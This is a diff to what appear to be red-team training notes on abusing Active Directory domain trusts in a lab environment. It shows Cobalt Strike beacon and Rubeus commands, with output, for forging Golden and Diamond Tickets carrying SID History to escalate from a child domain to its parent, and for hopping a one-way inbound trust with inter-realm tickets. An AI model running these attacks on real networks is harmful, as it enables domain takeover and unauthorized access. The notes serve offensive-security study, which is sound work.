@@ -16,7 +16,90 @@ When a child domain is added to a forest, it automatically creates a transitive,
     beacon> getuid
     [*] You are DEV\bfarmer
     beacon> powershell Get-DomainTrust
+    SourceName      : dev.cyberbotic.io    // current domain
+    TargetName      : cyberbotic.io        // foreign domain
+    TrustDirection  : Bidirectional
+
+If we have Domain Admin in the child, we can also gain Domain Admin privileges in the parent using a TGT with the SID History attribute (supports migrations, moving users between domains). To preserve access to resources in the "old" domain, the user's previous SID would be added to their SID History. When creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent. This can be achieved using either a Golden or Diamond Ticket:
+
+### Golden Ticket
+
+The only new info required from before is the SID of a target group in the parent domain:
+
+    beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
+    objectsid                                   
+    S-1-5-21-2594061375-675613155-814674916-512
+    beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name
+    Name              
+    dc-1.cyberbotic.io
+
+    PS C:\Users\Attacker> Rubeus.exe golden /aes256:51d7f... /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-... /sids:S-1-5-... /nowrap
+
+Then import it into a logon session and use it to access the parent DC:
+
+    beacon> run klist
+    beacon> ls \\dc-1.cyberbotic.io\c$
+
+### Diamond Ticket
+
+The Rubeus diamond command also has a /sids parameter, with which we can supply the extra SIDs we want in our ticket.
+
+    beacon> execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-... /krbkey:51d7f... /nowrap
+
+If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly due to transitive trust.
+
+Other means do not require DA in the child. kerberoast and ASREProast across domain trusts, which may lead to privileged credential disclosure. In the lab, principals in CYBER can be granted access to resources in DEV, there may be instances where they are accessing machines we have compromised. If they interact with a machine with unconstrained delegation, we can capture their TGTs. If they're on a machine interactively, such as RDP, we can impersonate them just like any other user.
+
+## One-Way Inbound
+
+In lab: dev.cyberbotic.io also has a one-way inbound trust with dev-studio.com:
+
+    beacon> powershell Get-DomainTrust
     SourceName      : dev.cyberbotic.io
-    TargetName      : cyberbotic.io
+    TargetName      : dev-studio.com
+    TrustDirection  : Inbound
 
+Because the trust is inbound from attacker perspective, it means that principals in our domain can be granted access to resources in the foreign domain. We can enumerate the foreign domain across the trust:
 
+    beacon> powershell Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
+    dnshostname      
+    dc.dev-studio.com
+
+Get-DomainForeignGroupMember will enumerate any groups that contain users outside of its domain and return its members:
+
+    beacon> powershell Get-DomainForeignGroupMember -Domain dev-studio.com
+
+Output shows a member of the domain's built-in Administrators group is not part of dev-studio.com. The MemberName field contains a SID that can be resolved in our current domain:
+
+    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
+    DEV\Studio Admins
+
+This means that members of DEV\Studio Admins are also members of the built-in Admin group of dev-studio.com and therefore inherit LA to dc.dev-studio.com.
+
+To hop this trust, need to impersonate a member of this Studio Admins domain group:
+
+    beacon> powershell Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
+    MemberName
+    nlamb
+
+To hop a domain trust using Kerberos, get an inter-realm key. 
+
+1: Obtain a TGT for the target user (using asktgt with their AES256 hash):
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779f... /nowrap
+
+2: Use the TGT to request a referral ticket from the current domain to the target domain:
+
+    beacon> execute-assembly Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj... /nowrap
+
+(this inter-realm ticket is an rc4_hmac though our TGT was aes256_cts_hmac_sha1; default configuration unless AES has been specifically configured on the trust, so not necessarily bad OPSEC.)
+
+3: Use this inter-realm ticket to request TGS's in the target domain; requesting a ticket for CIFS:
+
+    beacon> execute-assembly Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz... /nowrap
+    beacon> run klist
+    beacon> ls \\dc.dev-studio.com\c$
+
+## One-Way Outbound
+
+Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A; but users in Domain A should not be able to access resources in Domain B.  If we're in Domain A, then it's by design that we should not be able to access Domain B.  An outbound trust exists between cyberbotic.io and msp.org.  The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).
